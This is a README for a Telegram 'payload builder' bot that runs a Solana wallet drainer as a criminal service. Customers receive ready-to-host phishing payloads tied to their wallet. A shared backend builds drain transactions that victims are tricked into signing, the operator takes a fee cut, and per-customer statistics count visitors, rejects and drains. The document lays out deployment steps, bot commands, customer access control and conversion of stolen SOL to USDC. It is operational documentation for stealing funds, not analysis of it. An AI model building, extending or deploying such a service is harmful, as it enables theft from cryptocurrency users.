# Payload Builder Bot

Telegram bot that turns the drainer into a service: each customer sends their
Solana payout wallet, and the bot returns a ready-to-upload payload zip with
their wallet, the shared backend URL, the shared AES secret, and their own
chat id (for drain alerts) baked in.

## Architecture

```
Customer ──(Telegram)──► builder bot ──► patched payload.zip ──► customer's site
                             │
                             └─ templates/ (frame.html, frame.js, loader.js, vercel.json)

Visitor ──► customer's site ──► shared backend (server/) ──► drains to the
                                targetWallet sent by that payload (multi-tenant patch)
```

The backend runs once for everyone. The multi-tenant patch
(`server/wallet.js` + `server/server.js`) makes `buildDrainTransaction` honor
the `targetWallet` the client sends, so each payload drains to its own wallet.
One shared AES secret encrypts all client↔backend traffic.

## Setup

### 1. Deploy the shared backend

```bash
cd server
npm install
fly launch          # or reuse your existing app
fly secrets set AES_SECRET=<same-secret-as-bot> \
              TELEGRAM_BOT_TOKEN=<bot-token> \
              TELEGRAM_CHAT_ID=<your-chat-id> \
              RPC_ENDPOINT=<your-rpc>
fly deploy
```

The backend's `AES_SECRET` and the bot's `AES_SECRET` must be identical.
Generate one: `node -e "console.log('app_' + require('crypto').randomBytes(48).toString('hex'))"`

### 2. Configure the bot

```bash
cd bot
npm install
cp .env.example .env   # fill in BOT_TOKEN, BACKEND_URL, AES_SECRET
```

### 3. Run

```bash
npm start    # node --env-file=.env bot.js
```

Run it anywhere with Node 20+ (your machine, the VPS, or as a third
process group on the same Fly app). It uses plain long polling — no webhook
URL needed.

## Bot commands

| Command | What it does |
|---|---|
| `/start` | Begin — asks for the customer's wallet |
| `/build <wallet>` | Build directly, skipping the prompt |
| `/sites` | Manage your sites (list → per-site buttons: redeploy, delete, change wallet, USDC toggle) |
| `/stats` | Your funnel (visitors/rejects/drains) + earnings |
| `/cancel` | Clear session |
| `/whitelist <id>` | Admin — allow a user to use the bot |
| `/blacklist <id>` | Admin — block a user |
| `/access` | Admin — show whitelist + blacklist |
| `/fee [wallet[,w2]] [cut]` | Admin — show/set operator fee wallets + cut (live, next drain) |

`/sites` and `/stats` need hosted mode (`CHIMERA_API_URL` + `CHIMERA_SERVICE_KEY`).

## Files

```
bot/
├── bot.js           — the bot (zero deps besides adm-zip)
├── templates/       — payload files (symlink-style single source: ../server/public)
│   ├── frame.html   — full standalone page (what customers deploy)
│   ├── frame.js      — client logic
│   ├── loader.js     — widget loader variant
│   └── vercel.json   — Vercel deploy config
├── builds/          — per-chat build log (wallet + timestamp)
├── .env.example
└── package.json
```

## Notes

- Payload patches are regex-based, so templates survive re-copying from
  `server/public` at any time — values get overwritten per build.
- Access is closed by default: unknown users get a "no access" reply and
  the admin gets a one-time ping with their id — whitelist them with
  `/whitelist <id>` (persisted in `access.json`). `ALLOWED_CHAT_IDS` in
  `.env` adds extra allowed ids on top.
- Notifications: customers get every alert (visit, confirm, reject) in
  their own chat; the operator group (`OPERATOR_CHAT_ID` on the backend)
  gets hits (confirmed drains) only. Same chat+IP inside 10 minutes
  counts as one visit (page reloads + crawlers re-fire the beacon).
- USDC payouts: per-site toggle in `/sites`. When on, the backend swaps
  the customer's SOL share to USDC via Jupiter inside the victim-signed
  batch — output lands in the customer's USDC ATA. Any Jupiter failure
  falls back to a plain SOL drain.
- Stats: the backend keeps funnel counters + drain events in memory;
  chimera pulls them (pull-and-clear) before each machine recycle and
  accumulates into `data/stats.json`. `/stats` reads that plus a live
  pull, so mid-cycle hits are included.
- If you change the AES secret, redeploy both backend and bot, and old
  payloads keep working only if they share the new secret.
